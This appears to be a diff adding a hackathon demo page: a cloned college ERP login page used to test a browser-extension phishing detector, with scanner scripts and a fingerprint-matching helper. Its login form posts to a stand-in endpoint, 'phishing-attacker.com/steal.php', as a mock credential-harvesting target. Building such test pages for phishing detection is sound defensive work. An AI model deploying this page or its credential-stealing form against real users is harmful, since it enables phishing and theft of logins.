@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ABC College ERP Login - Student & Staff Portal</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+    body { background-color: #f4f6f9; color: #333; display: flex; flex-direction: column; min-height: 100vh; }
+    header { background-color: #003366; color: #fff; padding: 16px 32px; display: flex; align-items: center; justify-content: space-between; }
+    .logo-box { display: flex; align-items: center; gap: 12px; }
+    .logo-icon { width: 36px; height: 36px; fill: #ffffff; }
+    .college-name { font-size: 20px; font-weight: 700; }
+    .main-container { flex: 1; display: flex; align-items: center; justify-content: center; padding: 40px 20px; }
+    .login-card { background: #ffffff; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.08); width: 100%; max-width: 420px; padding: 36px; border: 1px solid #e2e8f0; }
+    .login-card h2 { color: #003366; font-size: 22px; font-weight: 700; margin-bottom: 8px; text-align: center; }
+    .login-card p { color: #64748b; font-size: 13px; margin-bottom: 24px; text-align: center; }
+    .form-group { margin-bottom: 20px; }
+    .form-group label { display: block; font-size: 13px; font-weight: 600; color: #475569; margin-bottom: 6px; }
+    .form-control { width: 100%; padding: 12px 14px; border: 1px solid #cbd5e1; border-radius: 8px; font-size: 14px; outline: none; transition: border-color 0.2s; }
+    .form-control:focus { border-color: #003366; box-shadow: 0 0 0 3px rgba(0, 51, 102, 0.1); }
+    .btn-login { width: 100%; background-color: #003366; color: #ffffff; border: none; padding: 12px; border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer; transition: background-color 0.2s; }
+    .btn-login:hover { background-color: #002244; }
+    .card-footer { margin-top: 20px; display: flex; justify-content: space-between; align-items: center; font-size: 12px; }
+    .card-footer a { color: #003366; text-decoration: none; font-weight: 600; }
+    .card-footer a:hover { text-decoration: underline; }
+
+    /* Security Status Banner for Demo */
+    .demo-bar { background: #450a0a; color: #fca5a5; text-align: center; padding: 8px; font-size: 12px; border-bottom: 1px solid #991b1b; }
+    .demo-bar span.domain { color: #f87171; font-weight: bold; }
+    .demo-bar span.badge { background: #ef4444; color: #fff; padding: 2px 8px; border-radius: 10px; font-weight: bold; font-size: 10px; margin-left: 8px; }
+  </style>
+
+  <!-- Embed Extractor, Scanner & Warning Overlay for Direct Demo Testing -->
+  <link rel="stylesheet" href="../../extension/src/ui/warningOverlay.css">
+  <script src="../../extension/src/scanner/domainChecker.js"></script>
+  <script src="../../extension/src/scanner/similarityEngine.js"></script>
+  <script src="../../extension/src/scanner/riskClassifier.js"></script>
+  <script src="../../extension/src/ui/warningOverlay.js"></script>
+  <script src="../../extension/src/content/extractFeatures.js"></script>
+</head>
+<body>
+  <div class="demo-bar">
+    HACKATHON DEMO: <strong>Exact Cloned Phishing Page</strong> | Hostname: <span class="domain">abc-college-login.netlify.app</span> <span class="badge">FAKE DOMAIN</span>
+  </div>
+
+  <header>
+    <div class="logo-box">
+      <svg class="logo-icon" viewBox="0 0 24 24">
+        <path d="M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82zM12 3L1 9l11 6 9-4.91V17h2V9L12 3z"/>
+      </svg>
+      <div class="college-name">ABC College of Technology</div>
+    </div>
+  </header>
+
+  <main class="main-container">
+    <div class="login-card">
+      <h2>ABC College ERP Portal</h2>
+      <p>Enter your student roll number or official email to log in</p>
+
+      <form action="https://phishing-attacker.com/steal.php" method="POST" id="loginForm">
+        <div class="form-group">
+          <label for="username">Roll Number / Email</label>
+          <input type="text" id="username" class="form-control" placeholder="Enter Roll No / Email" required>
+        </div>
+
+        <div class="form-group">
+          <label for="password">Password</label>
+          <input type="password" id="password" class="form-control" placeholder="Enter Password" required>
+        </div>
+
+        <button type="submit" class="btn-login">Sign In to ERP</button>
+      </form>
+
+      <div class="card-footer">
+        <a href="#forgot">Forgot Password?</a>
+        <a href="#help">Helpdesk Support</a>
+      </div>
+    </div>
+  </main>
+
+  <script>
+    // Scanner integration helper for direct browser viewing
+    window.CampusAuthGuardScanner = {
+      scanExtractedFeatures: function(features) {
+        const officialFingerprint = {
+          portalId: "abc-college-erp",
+          officialDomains: ["college.edu", "erp.college.edu"], // netlify.app is NOT official
+          pageTitle: "ABC College ERP Login - Student & Staff Portal",
+          brandKeywords: ["ABC College", "College of Technology", "Student Login", "ERP Portal", "Roll Number"],
+          formFingerprint: { passwordFieldCount: 1, emailOrTextFieldCount: 1, inputCount: 3, buttonTexts: ["Sign In to ERP"] },
+          domFingerprint: { tagSequence: ["div", "h2", "form", "input", "input", "button"], inputTypes: ["text", "password", "submit"], hasLogo: true },
+          visualFingerprint: { dominantColors: ["#003366", "#ffffff", "#f4f6f9"], headingText: "ABC College ERP Portal" }
+        };
+
+        // For demo: treat page hostname as fake phishing domain
+        const mockUrl = "https://abc-college-login.netlify.app/login";
+        const domainRes = DomainChecker.checkDomain(mockUrl, officialFingerprint.officialDomains);
+        const simRes = SimilarityEngine.calculateSimilarity(features, officialFingerprint);
+        const riskRes = RiskClassifier.classifyRisk(domainRes, simRes, features.hasPasswordField);
+        riskRes.similarityResult = simRes;
+
+        return { riskAssessment: riskRes, officialDomain: "erp.college.edu" };
+      }
+    };
+  </script>
+</body>
+</html>
